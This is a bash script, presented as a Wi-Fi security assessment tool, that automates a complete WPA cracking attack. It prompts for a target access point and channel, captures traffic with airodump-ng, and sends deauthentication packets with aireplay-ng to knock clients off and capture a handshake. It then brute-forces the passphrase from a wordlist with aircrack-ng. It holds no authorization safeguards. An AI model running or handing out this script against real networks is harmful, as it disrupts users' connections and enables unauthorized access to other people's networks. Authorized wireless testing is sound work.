#!/bin/bash

# Improved Wi-Fi Security Assessment Script
# Features: Input validation, error handling, modular structure, and process management

# Global Configuration
INTERFACE="wlan0"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
CAPTURE_PREFIX="wpa_capture_$TIMESTAMP"
WORDLIST=""
declare -gA TARGET=(["MAC"]="" ["CHANNEL"]="")

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m'

# Cleanup and error handling
cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up...${NC}"
    kill_processes
    exit 0
}

kill_processes() {
    for pid in "${BACKGROUND_PIDS[@]}"; do
        kill -9 "$pid" 2>/dev/null
    done
    wait 2>/dev/null
}

trap cleanup INT TERM EXIT

check_root() {
    if [ "$(id -u)" != "0" ]; then
        echo -e "${RED}[!] This script must be run as root${NC}"
        exit 1
    fi
}

check_tools() {
    local required=("airodump-ng" "aireplay-ng" "aircrack-ng")
    for tool in "${required[@]}"; do
        if ! command -v "$tool" &>/dev/null; then
            echo -e "${RED}[!] Missing required tool: $tool${NC}"
            exit 1
        fi
    done
}

validate_mac() {
    [[ "$1" =~ ^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$ ]] && return 0 || return 1
}

validate_channel() {
    [[ "$1" =~ ^[1-9][0-9]?$ ]] && return 0 || return 1
}

get_target_info() {
    while true; do
        read -p "Enter target AP MAC (00:11:22:33:44:55): " TARGET["MAC"]
        validate_mac "${TARGET[MAC]}" && break
        echo -e "${RED}[!] Invalid MAC address format${NC}"
    done

    while true; do
        read -p "Enter channel number: " TARGET["CHANNEL"]
        validate_channel "${TARGET[CHANNEL]}" && break
        echo -e "${RED}[!] Invalid channel number${NC}"
    done

    while true; do
        read -p "Enter path to wordlist: " WORDLIST
        [ -f "$WORDLIST" ] && break
        echo -e "${RED}[!] Wordlist file not found${NC}"
    done
}

scan_networks() {
    echo -e "\n${YELLOW}[*] Starting network scan...${NC}"
    airodump-ng "$INTERFACE"
}

start_capture() {
    echo -e "\n${YELLOW}[*] Starting handshake capture on channel ${TARGET[CHANNEL]}...${NC}"
    airodump-ng -c "${TARGET[CHANNEL]}" -d "${TARGET[MAC]}" -w "$CAPTURE_PREFIX" "$INTERFACE" &
    BACKGROUND_PIDS+=($!)
    sleep 5
}

deauth_attack() {
    echo -e "${YELLOW}[*] Sending deauthentication packets...${NC}"
    aireplay-ng -0 10 -a "${TARGET[MAC]}" "$INTERFACE"
}

monitor_handshake() {
    echo -e "${YELLOW}[*] Monitoring for handshake (Ctrl+C to abort)...${NC}"
    while true; do
        if aircrack-ng -q "${CAPTURE_PREFIX}-01.cap" 2>/dev/null | grep -q "WPA (1 handshake)"; then
            echo -e "${GREEN}[+] Handshake successfully captured!${NC}"
            return 0
        fi
        sleep 5
    done
}

crack_password() {
    echo -e "\n${YELLOW}[*] Starting password cracking...${NC}"
    aircrack-ng -w "$WORDLIST" "${CAPTURE_PREFIX}-01.cap"
}

main() {
    check_root
    check_tools

    echo -e "\n${GREEN}=== Wi-Fi Security Assessment Tool ===${NC}"
    
    scan_networks
    get_target_info
    start_capture
    deauth_attack
    monitor_handshake && crack_password

    echo -e "\n${GREEN}[+] Process completed!${NC}"
    echo -e "Capture files saved as: ${CAPTURE_PREFIX}-*.cap"
}

main
